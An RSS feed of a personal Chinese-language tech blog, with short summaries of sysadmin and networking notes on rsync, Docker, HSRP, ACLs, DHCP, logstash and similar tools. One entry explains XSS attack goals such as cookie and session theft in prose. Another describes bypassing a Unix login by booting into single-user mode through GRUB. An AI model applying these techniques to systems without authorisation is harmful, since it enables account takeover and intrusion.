Android 頁面的入口轉換將頁面向上滑動並淡入。退出的轉換是相同的，但滑動是相反 iOS 頁面從右側滑入並反向退出。當另一頁進入以覆蓋它時，頁面也會在視覺中向左移動 此轉換僅因 MaterialPageRoute 而發生。要修改此轉換動畫，需使用 MaterialPageRoute 或 PageRouteBuilder
flutter Code import &amp;#39;package:flutter/material.dart&amp;#39;; import &amp;#39;package:flutter/painting.dart&amp;#39;; import &amp;#39;package:flutter/widgets.dart&amp;#39;; /** * 定義一個按鈕的結構 * title 該按鈕名稱 * routeName 該按鈕路由名稱 */ class BottomButtonModel { String title; String routeName; /// 建構方法(Constructor) BottomButtonModel(String title, String routeName) { this.</description></item><item><title>rsync 應用</title><link>https://cch0124.github.io/project/2019-07-28-rsync/</link><pubDate>Sun, 28 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-07-28-rsync/</guid><description>Description 我是用 NAS 存放備份檔。方式有 2 種
rsync 來建立鏡像資料夾。您需先用 CIFS 或 NFS 來將 Synology NAS 上的資料夾掛載至 Linux 伺服器。 Linux 執行指令，無需掛載資料夾。 其中第 2 種方式是我實做出來的方式。
rsync rsync 是一種異地備份軟體，與一般備份軟體不同的是，rsync 採用增量備份的方式，此類備份方式在每次備份前會先比較兩邊資料的差異，然後僅將差異的資料備份過去，而非備份全部的資料。
rsync 用於遠程複製和同步文件和目錄，以及在 Linux/Unix 系統中本地複製和同步。借助 rsync 命令，您可以跨目錄，跨硬碟和網路遠端和本地複製和同步數據，在兩台 Linux 計算機之間執行數據備份和鏡像。
rsync 的運作方式分為以下兩種：
伺服器（Server）模式
以常駐（Daemon）的方式運作，亦即以伺服器模式來服務（預設通訊埠為873），通常會在目的端運作，接收其他主機的備份資訊。 客戶端（Client）模式
以一般程式方式運作，可視為使用者端（Client）程式，通常用在來源端主機上，將資料備份到備份主機上運作。 rsync 優點和功能 它有效的將文件複製到遠端系統或從遠端系統同步文件。 支持複製 links、devices、owners、groups 和 permissions。 它比 scp（Secure Copy）更快，因為 rsync 使用遠端更新協議，它允許僅傳輸兩組文件之間的差異。第一次，它將文件或目錄的全部內容從源複製到目標，但是從下次起，它僅將更改的塊和字節複製到目標。 Rsync 消耗較少的 bandwidth，因為它使用壓縮和解壓縮方法，同時發送和接收數據兩端。 rsynv 參數 -v</description></item><item><title>du</title><link>https://cch0124.github.io/blog/2019-07-15-du/</link><pubDate>Mon, 15 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-07-15-du/</guid><description>du 指令 用途式顯示目錄或檔案大小
du 的 arg 參數 功能 -a 顯示目錄中個別檔案大小 -b 以 byte 為單位顯示大小 -c 顯示個別檔案大小以及總和 -D 顯示符號連接的來源檔大小 -h 以 k（KB）、M（MB）、G（GB）顯示 -H 以 1000 為 k 的單位（非 1024） -s 只顯示總和 -S 顯示目錄內容時，不包含子目錄大小 -x 若目錄中有不同的檔案系統，就不顯示 &amp;ndash;max-path 僅搜尋指定的目錄層級 &amp;ndash;exclude 忽略指定檔案或目錄</description></item><item><title>Net Namespaces</title><link>https://cch0124.github.io/project/2019-07-03-namespace/</link><pubDate>Wed, 03 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2019-07-03-namespace/</guid><description>Namespaces tags: SDN Namespaces 是 Linux kernel 的一項功能，它對 kernel 資源進行區分隔離，使得一組行程看到一組資源，而另一組行程看到一組不同的資源。 好比一棟房子有多個房間，一個房間表示一組資源，妹妹住一間、哥哥住一間，彼此之間是相互看不到內部資源的，為每一個人提供隱私。
可分為下面幾列
pid Namespaces net Namespaces ipc Namespaces mnt Namespaces uts Namespaces user Namespaces Namespaces 不限制對 CPU、memory 和 disk 等物理上資源的存取。該存取由 cgroups 的 kernel 功能計算和限制。
Experiment Create network namespace cch@ubuntu:~$ sudo ip netns add red # create a new named network namespace cch@ubuntu:~$ sudo ip netns add blue cch@ubuntu:~$ sudo ip netns list # show all of the named network namespaces blue red 此圖是利用上面指令達成的構圖。建立 red 和 blue 的 namespace。</description></item><item><title>食物紀錄</title><link>https://cch0124.github.io/life/2020-07-01-food-history/</link><pubDate>Mon, 01 Jul 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/life/2020-07-01-food-history/</guid><description>20200721</description></item><item><title>throughout</title><link>https://cch0124.github.io/blog/2019-05-21-throughput/</link><pubDate>Tue, 21 May 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-05-21-throughput/</guid><description>Throughput（吞吐量）是指系統可以在指定的時間內處理的單元的數量。像是 internet 之類的通訊網路的環境中，吞吐量是訊息成功傳遞的速率。
什麼是 Throughput 網路吞吐量通常表示為平均值，以每秒位數（bps）為單位，或者在某些情況下以每秒 data packets 為單位。吞吐量是網路連接性能和質量的重要指標。不成功的訊息傳遞的高比率，會導致較低的吞吐量和降低性能的問題。
網路設備通過交換 data packets 進行通訊。吞吐量表示從網路上的一個點到另一個點的成功數據包傳送的級別。沿途丟棄 data packets 會降低吞吐量和網路連接質量。對於某些即時服務要求的吞吐量就會較高。
網路吞吐量受許多因素的影響，這些屬性包括
物理硬體的處理能力 電纜和路由器 網路擁塞和 data packets 丟失也會對吞吐量產生影響 Bandwidth 與 Throughput 差異 Bandwidth（頻寬）是指 internet 通道的大小。internet 通訊通常用稱為 data packets 的數據形式產生。頻寬是指這些 data packets 的大小以及可以同時通過 internet 通道傳輸的數量。與吞吐量的一個重要區別是頻寬是指 internet 通道的實際大小或容量；吞吐量是指實際傳輸的 data packets 的數量。
使用高速公路的比喻，頻寬將是在一段時間內沿著該高速公路行駛的汽車總數（越多通道所傳送的資料越多）。事故和道路封閉後，吞吐量將是實際通過高速公路長度的汽車數量。
Throughput 和網際網路速度 大多數人認為 internet 速度是下載或上傳檔案所需的時間。速度也可以指硬體設備或 internet 連接的 &amp;ldquo;rated speed&amp;rdquo;。
例如，經常聽到超快 100 Mbps 的 internet 連接。預設情況下，這些速度表示特定 Internet 連接的吞吐量。事實上，這些 internet 連接速度可以更準確的描述為連接的實際帶寬，實際數據傳輸容量或吞吐量可能要低得多。</description></item><item><title>負載均衡</title><link>https://cch0124.github.io/blog/2019-04-06-hsrp/</link><pubDate>Sat, 06 Apr 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-04-06-hsrp/</guid><description>HSRP Introduction HSRP 是提供 first-hop 來提供高網路可用性的標準方法。它使一組路由器接口能夠協同工作，向 LAN 上的主機呈現單個虛擬路由或 default gateway 的方法。在網路的多個路由器上配置 HSRP 時，它會提供虛擬媒體訪問控制（MAC,virtual Media Access Control）位址和一組已配置的路由器之間共享的 IP 地址。
當其中一個路由器被選擇為 active 路由器，另一個路由器作為 standby 路由器。在一組設有 HSRP 路由器接口中，active 路由器是路由封包的首選路由器；standby 路由器是在 active 路由器出現故障或滿足預設條件時接管路由任務的路由器。
HSRP 支持的任何路由器接口
Implement HSRP Topology 這邊 Cloud1 是透過虛擬機網路卡取得 IP，這邊不詳述。
目標 配置 EIGRP 設定 HSRP 測試 EIGRP Configuration 我將 R1、R2、R3、R4 配置 EIGRP 協定並將 AS 設定為 100。 這邊用 R1、R2 做範例，其中會在 EIGRP 中加入預設路由。
R1 router eigrp 100 network 172.16.1.0 0.0.0.3 redistribute static metric 100000 1000 255 1 1500 R2 router eigrp 100 network 10.</description></item><item><title>掛載雲端硬碟至本機</title><link>https://cch0124.github.io/blog/2019-02-23-rai-dirver/</link><pubDate>Sat, 23 Feb 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-02-23-rai-dirver/</guid><description>RaiDrive RaiDrive 是一款免費的軟體。可以將雲端硬碟 Google Drive、OneDrive、Dropbox 等 SaaS 服務透過此軟體將雲端硬碟映射成本機端的硬碟。操作方式就跟本機上的硬碟一樣，這樣減少了開瀏覽器登入這些 SaaS 服務才能操作，相當方便。相對於電腦上硬碟容量不夠大的使用者，透過此方式將檔案（影片、文件）直接放入此映射出來的硬碟。
使用 點選 Storage 的 Google Drive，Drive 可編輯名稱，點選 OK 後會跳至網頁選擇登錄的使用者，即可完成。</description></item><item><title>Backup</title><link>https://cch0124.github.io/blog/2019-02-14-duplicati/</link><pubDate>Thu, 14 Feb 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-02-14-duplicati/</guid><description>duplicati duplicati 是一個開源的備份軟體，可用在 cloud storage 服務或者 file server。 duplicati 可工作於 WebDAV、Google Cloud Drive、MEGA&amp;hellip;等等。
最近會使用原因，因為社群有人寫文章分享，我有時也會備份資料去雲端但大多數是開著雲端網頁拉某資料夾的檔案到網頁。因為那篇文章我就嘗試運用 duplicati 做定期備份，這樣減少了我的干預。Duplicati 也提供強大的加密功能，同時備份檔案放在公共網路服務器上比在家中未加密的文件更安全。
Install 以 ubuntu 為主機安裝 duplicati 此軟體。載點
$ wget https://updates.duplicati.com/beta/duplicati_2.0.4.5-1_all.deb $ sudo dpkg -i duplicati_2.0.4.5-1_all.deb (Reading database ... 99829 files and directories currently installed.) Preparing to unpack duplicati_2.0.4.5-1_all.deb ... Unpacking duplicati (2.0.4.5-1) over (2.0.4.5-1) ... dpkg: dependency problems prevent configuration of duplicati: duplicati depends on mono-runtime (&amp;gt;= 3.0); however: Package mono-runtime is not installed. duplicati depends on libmono-2.</description></item><item><title>ACL</title><link>https://cch0124.github.io/blog/2019-01-22-acl/</link><pubDate>Tue, 22 Jan 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-01-22-acl/</guid><description>ACL IP Access Control Lists (ACLs)，根據以下內容過濾 IP 數據包：
Source address Destination address Type of packet Any combination of these items 為了要過濾網路流量，ACL 控制是否在路由器 interface 上 forward 或 drop 路由數據包。
Source address of the traffic Destination address of the traffic Upper-layer protocol Standard ACLs 將 IP 數據包的 source address 與 ACL中配置的 address 進行比較，以控制流量，但不能針對特定的網路協定指定允許或拒絕的動作處理。 Extended ACLs 將 IP 數據包的 source address 和 destination address 與 ACL 中配置的地址進行比較或針對特定的網路協定做處置，以控制流量。可以使 extended ACL 更精細，並配置為按以下標準過濾流量：</description></item><item><title>RIP 與子網路切割</title><link>https://cch0124.github.io/blog/2019-01-05-rip/</link><pubDate>Sat, 05 Jan 2019 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2019-01-05-rip/</guid><description>拓樸 學習目標 切割子網路 設定 RIP 協定 ping 和 traceroute 驗證 封包驗證 拓樸子網路分配取切割 定義了 192.168.1.0/24 是給一間學校的網段。其中 R1、R2、R3 是學校三棟大樓的核心。 R1 假設為一年級電腦教室，在介面 e5/0 下給了 40 個主機給一年級使用；R2 假設為二、三年級電腦教室，在介面 e5/0 給了 80 個主機給二年級電腦教室使用；R3 假設為四年級電腦教室，在介面 e5/0 給了 20 個主機給二年級電腦教室使用。但是要如何有效切割子網路才能達到節省 IP 的目標 ? 「必須利用無類別區隔路由（CIDR）技巧來達到節省 IP」。
IP 為 32 bit 組成，IP 位址以 Classful 分類為 A、B、C、D、E 五類。是以 32 bit 以每 8 bit 一組來區隔做不同的類別，如下表。
網路類別 IP 位置範圍 Class A 0.0.0.0 ~ 127.</description></item><item><title>ups 應用</title><link>https://cch0124.github.io/project/2018-12-24-apc-ups/</link><pubDate>Mon, 24 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-12-24-apc-ups/</guid><description>APC UPS 環境 Back-UPS Pro 700 ubuntu 12 安裝套件 在 ubuntu 安裝 ups 套件，讓 ups 能控制系統
$ sudo apt-get -y install apcupsd ... Please check your configuration ISCONFIGURED in /etc/default/apcupsd 配置檔 /etc/apcupsd$ tree . ├── apccontrol ├── apcupsd.conf ├── changeme ├── commfailure ├── commok ├── hosts.conf ├── killpower ├── multimon.conf ├── offbattery ├── onbattery └── ups-monitor 0 directories, 11 files /etc/apcupsd$ sudo vi apcupsd.conf UPSCABLE usb # 定義將 UPS 連接到 computer 的電纜類型。 UPSTYPE usb DEVICE # 啟用自動檢測，不使用串行電纜交換信號 SCRIPTDIR /etc/apcupsd # apccontrol和事件腳本所在的目錄。 UPSNAME UPS_700 在 apcupsd 包電源故障的情況下，通知給商用電源的用戶，當商用電源未恢復時，損失如果電池耗盡，或指定的超時時間段已經過去，它已達到指定的電池充電速率任一，或已經達到剩餘電池壽命（通過基於內部UPS計算電力消耗速率來確定）。如果滿足任何這些關閉條件，請執行關閉。</description></item><item><title>logstash Multiple Pipelines</title><link>https://cch0124.github.io/project/2018-12-22-logstash-multiple-pipelines/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-12-22-logstash-multiple-pipelines/</guid><description>logstash Multiple Pipelines 遇到的問題是，使用 filebeat 將 json 數據傳遞給 logstash 處裡並建立索引 pcap 與使用 logstash 讀取 CSV 數據建立 CSV 索引。 兩者都是不同的索引。但是 kibana 上的 pcap 索引卻讀取 csv 索引數據。這造成分析上的錯誤。以下會先了解 logstash 運作以及解決方式。
Logstash 事件處理管道有三個階段：inputs → filters → outputs。
inputs 生成事件 filters 修改它們，輸出將它們發送到其他地方 輸入和輸出支援編解碼，能夠在數據進入或退出管道時對數據進行編碼或解碼，而無需使用單獨的 filters。
inputs 將輸入的數據導入至 logstash。 常用的輸入：
file 從文件系統上的文件讀取，與UNIX命令非常相似 tail -0F syslog 在已知端口514上偵聽syslog消息並根據RFC3164格式進行解析 redis 使用 redis 通道和 redis 列表從 redis 服務器讀取。 Redis 通常用作集中式 Logstash 安裝中的&amp;quot;broker&amp;quot;，該安裝將 Logstash 事件從遠程 Logstash &amp;ldquo;shippers&amp;rdquo; 排隊。 beats 處理 Beats發送的事件 plugins</description></item><item><title>XSS</title><link>https://cch0124.github.io/blog/2018-12-22-xss/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-12-22-xss/</guid><description>XSS XSS 為跨網站指令碼（Cross-Site Scripting），通常是網頁開發者在開發時疏忽的漏洞，攻擊著發現網站存在漏洞便會利用代碼注入的方式將惡意的指令碼植入該網站。
XSS 主要受害者是瀏覽被注入代碼網站的使用者，因為惡意的指令碼會被瀏覽者下載到本地端執行，藉此取得使用者的資訊。
攻擊手段 竊取 cookie、session，使得不需要帳號密碼即可登入。 植入惡意 Flash，例用 crossdomain 權限進一步取得更高權限 利用 javascript 以受害者身分執行特定動作 利用 javascript 對其它網站造成 DDos 利用 iframe、frame、XMLHttpRequest 以釣魚網站覆蓋原本頁面（Clicckjacking） 結合其它漏洞（CSRF）進行更進一步的惡意行為。PaPy 傳播 XSS 蠕蟲 獲取使用者端相關資訊，如使用者的歷史紀錄 CSRF 是代替用戶完成指定的動作，需要知道其他用戶頁面的代碼和數據包。
典型跨網站指令碼 DOM（Document Object Model） 反射型 儲存型 其中反射型和DOM，都是輸入便得到輸出，儲存型則是輸入後先儲存置資料庫，當取用時再從資料庫中取出並輸出，因此儲存型會把惡意代碼存到伺服器上。
DOM XSS HTML 檔都是以 Document Object Model 進行各種標籤與元件架構而成，此類型攻擊原理由 javascript 在動態更新網頁時，從網址中提取數據並進行惡意 script 的執行。
DOM XSS 主要是 javascript 的 API 原始碼審查的不夠嚴謹造成的，如：document.location、document.URL、document.URLUnencoded、document.referrer、window.location 等 API 都可能透過惡意設計的 URL 來控制彈跳視窗，此類型大多為網站釣魚，對系統不致造成危害，且 DOM XSS 攻擊屬於被動式攻擊，無使用者連線該 URL 即不會觸發。</description></item><item><title>前人沒留下資料，需要通靈</title><link>https://cch0124.github.io/blog/2018-12-10-forget-password/</link><pubDate>Mon, 10 Dec 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-12-10-forget-password/</guid><description>unix 忘記密碼 在開機時，按下 Esc。開啟 GRUB 開機選單 按下鍵盤上的「e」鍵 會看一個參數編輯的視窗 找有 linux /boot/vmlinuz-X.XX.X 在最後一行加上 single 參數 編輯好參數之後，按下 Ctrl + x 或是 F10 開機，接著就會進入單機模式。 在單機模式之下，使用 passwd 更改一般使用者（或 root）的密碼 最後執行 reboot 重新開機，就可以用新的密碼登入了。 Ref gtwang</description></item><item><title>apt 使用</title><link>https://cch0124.github.io/blog/2018-11-25-apt/</link><pubDate>Sun, 25 Nov 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-11-25-apt/</guid><description>apt apt 是 Debian 和 Ubuntu 系統中的核心工具。可以使用 apt 指令安裝或刪除應用程式。
應用 因為我在學校有負責管理 bit 系統，因為當時交接給我的人得知的資訊很少，當時也想了解系統上所安裝的應用程式和依賴的應用程式，因此對 apt 指令的應用做了一個筆記。 交接時文件很重要，這會讓下一個交接者加速了解環境。
取得更新（update） $ sudo apt update Hit:1 http://us.archive.ubuntu.com/ubuntu xenial InRelease Hit:2 https://download.docker.com/linux/ubuntu xenial InRelease Get:3 http://us.archive.ubuntu.com/ubuntu xenial-updates InRelease [109 kB] Get:4 http://us.archive.ubuntu.com/ubuntu xenial-backports InRelease [107 kB] Get:5 http://security.ubuntu.com/ubuntu xenial-security InRelease [109 kB] Fetched 325 kB in 4s (66.5 kB/s) Reading package lists... Done Building dependency tree Reading state information... Done 163 packages can be upgraded. Run 'apt list --upgradable' to see them.</description></item><item><title>新增網站</title><link>https://cch0124.github.io/blog/2018-11-23-new-web/</link><pubDate>Fri, 23 Nov 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-11-23-new-web/</guid><description>事由 每年系統會增加一個期刊，於是我照著之前先人的 SOP 走，但群組設定部分好像有小差錯。
更改群組名稱 $ cat /etc/group | grep iihmsp sudo:x:27:mykuo,itachi,jni,iihmsp19 www-data:x:33:ychuang,jni,jihmsp,iihmsp19 iihmsp14:x:1004: iihmsp15:x:1005: iihmsp11:x:1010: iihmsp16:x:1035: iihmsp17:x:1040: iihmsp2019:x:1052: itachi@ubuntu:/home/home1$ sudo groupmod -n iihmsp2019 iihmsp19 groupmod: group 'iihmsp19' does not exist itachi@ubuntu:/home/home1$ sudo groupmod -n iihmsp19 iihmsp2019 itachi@ubuntu:/home/home1$ cat /etc/group | grep iihmsp sudo:x:27:mykuo,itachi,jni,iihmsp19 www-data:x:33:ychuang,jni,jihmsp,iihmsp19 iihmsp14:x:1004: iihmsp15:x:1005: iihmsp11:x:1010: iihmsp16:x:1035: iihmsp17:x:1040: iihmsp19:x:1052:</description></item><item><title>掛載硬碟</title><link>https://cch0124.github.io/blog/2018-09-15-disk-mount/</link><pubDate>Sat, 15 Sep 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-09-15-disk-mount/</guid><description>事由 那年是我剛進實驗室的第 2 個月，因為我對 linux 系統較熟，所以我接了管理的這一部分。沒想到此系統沒幾天後硬碟竟然壞了，於是我呼叫我朋友幫我處裡硬碟部分（硬碟還原），我負責掛載。
分割區切割 Linux 的分割區有 90 多種，但實際只會用到四種，數字表分割代碼
Linux swap（82） 虛擬記憶體 Linux（83） 適和使用分割區 Extended（5） 要劃分四個分割區以上，必須使用 Linux LVM（8e） LVM 分割區 新增硬碟至 ubuntu 檢查第二顆是否有偵測到
$ dmesg |grep hd 再次確認
$ sudo fdisk -l /dev/sdb # 確認硬碟分割區狀態 [sudo] password for itachi: Disk /dev/sdb: 2000.4 GB, 2000398934016 bytes 255 heads, 63 sectors/track, 243201 cylinders, total 3907029168 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 4096 bytes I/O size (minimum/optimal): 4096 bytes / 4096 bytes Disk identifier: 0x00000000 Disk /dev/sdb doesn&amp;#39;t contain a valid partition table 接著開始分割 進入 fdisk</description></item><item><title>NAS 與 ESXi</title><link>https://cch0124.github.io/project/2018-07-14-nas-esxi/</link><pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-14-nas-esxi/</guid><description>這邊因要將備份的虛擬機放至 NAS，NAS 必須使用掛載方式。
掛載、卸載 NAS 掛載 [root@localhost:/opt/ghettovcb/bin] esxcfg-nas -a -o 192.168.7.11 -s /volume1/ASUS-Server [NAME] Connecting to NAS volume: [NAME] Belstar_KH created and connected. # -a|--add Add a new NAS filesystem to /vmfs volumes. Requires --host and --share options. Use --readonly option only for readonly access. # -o|--host &amp;lt;host&amp;gt; Set the host name or ip address for a NAS mount. For version 4.1, can be a comma-separated list. # -s|--share &amp;lt;share&amp;gt; Set the name of the NAS share on the remote system.</description></item><item><title>rsyslog 應用</title><link>https://cch0124.github.io/project/2018-07-18-rsyslog/</link><pubDate>Wed, 18 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-18-rsyslog/</guid><description>rsyslog 服務為 Client/Server 服務，可同時實現兩種角色。
它可以作為服務器運行並收集網路中其他設備傳輸的所有日誌。
可以將所有記錄到遠程終端系統 syslog server 的 internal system events 發送到 Client 運行。 environment Ubuntu 14.04 Rsyslog Server Ubuntu 14.04 Client D-link Installation and configuration 預設上，只要安裝好 Ubuntu 都會有 rsyslog
verify dpkg --list 查看已安裝的套件 itachi@ubuntu:~$ dpkg --list | grep rsyslog ii rsyslog 7.4.4-1ubuntu2.6 amd64 reliable system and kernel logging daemon rsyslogd -v 查看版本 itachi@ubuntu:~$ rsyslogd -v rsyslogd 7.</description></item><item><title>DHCP 使用</title><link>https://cch0124.github.io/project/2018-07-06-dhcp/</link><pubDate>Fri, 06 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-06-dhcp/</guid><description>Description DHCP (Dynamic Host Configuration Protocol) Client 連上 DHCP Server 後，server 會提供 IP、gateway、DNS server 給 client Clients request 使用 UDP port 68 Server response 使用 UDP port 67 Environment DHCP Server - Ubuntu 14.04
Network - Host-Only 網段 192.168.8.0 DHCP Clients - Ubuntu 14.04（test1） and Ubuntu 14.04（test2）
Netwok - 網卡設定（VMware）成跟 Server 一樣 Installing DHCP in DHCP Server [itachi@ubuntu:~] sudo apt install isc-dhcp-server -y DHCP Server Setting DHCP 接口 [itachi@ubuntu:~] vi /etc/default/isc-dhcp-server INTERFACES=&amp;#34;eth0&amp;#34; # 接口上提供DHCP請求，可以多個。 網路設定 DHCP Server 設定 static Network</description></item><item><title>Apache 使用</title><link>https://cch0124.github.io/project/2018-07-05-apache/</link><pubDate>Thu, 05 Jul 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/project/2018-07-05-apache/</guid><description>env ubuntu 14.04 apache2 PHP 7 Install Apache 套件 itachi@ubuntu:~$ sudo apt install apache2 -y Apache 版本 itachi@ubuntu:~$ apache2 -v Server version: Apache/2.4.7 (Ubuntu) Server built: Sep 18 2017 16:37:54 PHP7.0 套件 apache 為 php7.0 nginx 為 php7.0-fpm itachi@ubuntu:~$ sudo add-apt-repository ppa:ondrej/php #`Debian` 及其衍生產品（如 `Ubuntu`）維護的 `PPA` itachi@ubuntu:~$ sudo apt update itachi@ubuntu:~$ sudo apt install php7.0 -y PHP 版本 php -v itachi@ubuntu:~$ php -v PHP **7.</description></item><item><title>LNMP 與 wordpress</title><link>https://cch0124.github.io/blog/2018-05-28-nginx-php-fpm-mysql/</link><pubDate>Mon, 28 May 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-05-28-nginx-php-fpm-mysql/</guid><description>Install And Setting Nginx install 可以透過 apt show 或 apt search 去查詢 nginx 版本
$ sudo apt install nginx -y # 安裝 服務使用
$ sudo systemctl start nginx.service $ sudo systemctl stop nginx.service $ sudo systemctl restart nginx.service $ sudo systemctl status nginx.service Check Nginx Web Service $ ps -aux | grep nginx root 12900 0.0 0.0 124976 1420 ? Ss 21:03 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; www-data 12901 0.</description></item><item><title>mariadb 安裝使用</title><link>https://cch0124.github.io/blog/2018-05-26-mariadb/</link><pubDate>Sat, 26 May 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-05-26-mariadb/</guid><description>mariadb install $ sudo apt install mariadb-server -y 設定檔 /etc/mysql log /var/log/mysql
服務使用
$ sudo systemctl start mysql.service $ sudo systemctl stop mysql.service $ sudo systemctl restart mysql.service $ sudo systemctl status mysql.service mariadb connect $ sudo mysql # 預設無密碼登入 Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 43 Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</description></item><item><title>Docker 資源詳解</title><link>https://cch0124.github.io/blog/2018-03-30-docker-run/</link><pubDate>Fri, 30 Mar 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-03-30-docker-run/</guid><description>Table of content Docker image Docker Port mapping Docker Volume mapping Docker Networking Docker image Dockerfile 是建構 image 的檔案，建構 image 時會讀取 Dockerfile 的指令一層一層的建構。而 container 是由 image 建構出來的實例。
image 特點 分層儲存 當需要修改 image 內的某個檔案時，只會對上方的讀寫層進行改動，不會覆蓋下層既有檔案系統內容。
Copy-on-Write 從分層儲存可以知道，在建立 container 之後我們會在一個可寫層上並進行操作，但是在 image layers 的檔案能否修改 ? 是可以的，會複製該檔案至可寫層。
Dockerfil Arg by 網管人
CMD vs ENTRYPOINT 在 Dockerfile 中，只能有一個 ENTRYPOINT 或 CMD 指令，如果有多個 ENTRYPOINT 或 CMD 指令則以最後一個為準。
ENTRYPOINT 往往用於設置容器啟動後的第一個命令，這對一個容器來說往往是固定的。 執行 docker run 如果帶有其他命令參數，不會覆蓋 ENTRYPOINT 指令 docker run 的 &amp;ndash;entrypoint 可以覆蓋 Dockerfile 中 ENTRYPOINT 設置的命令。 CMD 往往用於設置容器啟動的第一個命令的默認參數，這對一個容器來說可以是變化的。docker run &amp;lt;command&amp;gt; 往往用於給出替換 CMD 的臨時參數。 docker run 如果帶有其他命令參數，將會覆蓋 CMD 指令。 如果在 Dockerfile 中，還有 ENTRYPOINT 指令，則 CMD 指令中的命令將作為 ENTRYPOINT 指令中的命令的參數。 Example Nginx Dockerfile FROM ubuntu:14.</description></item><item><title>basic command of docker</title><link>https://cch0124.github.io/blog/2018-03-29-docker-command/</link><pubDate>Thu, 29 Mar 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-03-29-docker-command/</guid><description>Table of content Basic command Image command Containers Command Basic command 查看 Docker 訊息 docker info 登入 hub.docker.com docker login Image command 查看本地端以下載的 image docker images 移除 image docker rmi -f {image ID} # -f 強制，直接將運行中的 container 刪除 取得 container 的資訊 docker inspect {ImageID} 取得 image 的歷史紀錄 docker history {ImageName} Containers Command 取得運行的 container docker ps -a 運行 container docker run -it {imageName} 取得該 container 的 log docker logs {CONTAINER} 啟動 container docker start {ConatainerName} 停止 container docker stop {ConatainerName} 暫停 container docker pause &amp;lt;ConatainerName&amp;gt; 取消暫停 container docker unpause {ConatainerName} kill 運行中的 container docker kill {ConatainerName} 移除 container docker rm {ConatainerName} 進入 container docker exec -it {ConatainerName}</description></item><item><title>basic command of docker-compose</title><link>https://cch0124.github.io/blog/2018-03-29-docker-compose-command/</link><pubDate>Thu, 29 Mar 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-03-29-docker-compose-command/</guid><description>docker compose Docker compose 是一個用於定義和運行多個容器的 Docker 的工具。 它使用 yml 檔案定義應用程式服務。
docker-compose 指令基於每個工作目錄 可以在一台電腦上運行多個 Docker 容器 Table of content run yml file 將容器及環境配置移除 查看 container 運行資訊 kill 特定 container 刪除 container run yml file docker-compose up -d -f {.yml} # -d 後臺運行，-f 指定 docker-compose yml 檔案 將容器及環境配置移除 docker-compose down 查看 container 運行資訊 docker-compose ps kill 特定 container docker-compose kill {service} 刪除 container 要將刪除的 container 先停止運行
docker-compose rm {service}</description></item><item><title>Network Troubleshotting</title><link>https://cch0124.github.io/blog/2018-01-28-network-troubleshotting/</link><pubDate>Sun, 28 Jan 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-01-28-network-troubleshotting/</guid><description>通常如果實體設備能正常工作，接下來會藉由一些網路相關的指令或工具進行網路上的除錯。像是確認 A 能否抵達 B 等。下面描述的是一些除錯的指令與工具。
ping 先前有提到過，這邊就不提了
DSN Troubleshotting dig dig 驗證 DNS 主機地址、MX 記錄和所有其他 DNS 記錄，方便了解 DNS 部署情況。
$ dig www.nkust.edu.tw ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.3-P4-Ubuntu &amp;lt;&amp;lt;&amp;gt;&amp;gt; www.nkust.edu.tw ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 462 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; MBZ: 0005 , udp: 1280 ;; QUESTION SECTION: ;www.</description></item><item><title>人所習慣的視覺化</title><link>https://cch0124.github.io/blog/2018-01-24-shell-text-background-color/</link><pubDate>Wed, 24 Jan 2018 00:00:00 +0000</pubDate><guid>https://cch0124.github.io/blog/2018-01-24-shell-text-background-color/</guid><description>Visualize 視覺化能夠增強人類感知，將一些資料中的重要資訊用特別的顏色顯示，有助於提供將重要資訊顯示。
生活中日歷上特殊節日也會以紅色顯示，如國歷 10/10 國慶日、農曆 8/15 中秋節等等。
如果再 ubuntu 文字介面下沒有特別突出的顏色應該是不會去特別注意，像是安裝套件有錯誤或警告幾乎以特別的顏色顯示，以吸引或引導的方式幫助我們解決錯誤。
Matching styles to numbers 樣式
0 一般樣式 1 粗體 4 加底線 5 灰底 7 文字及背景顏色對調 文字顏色
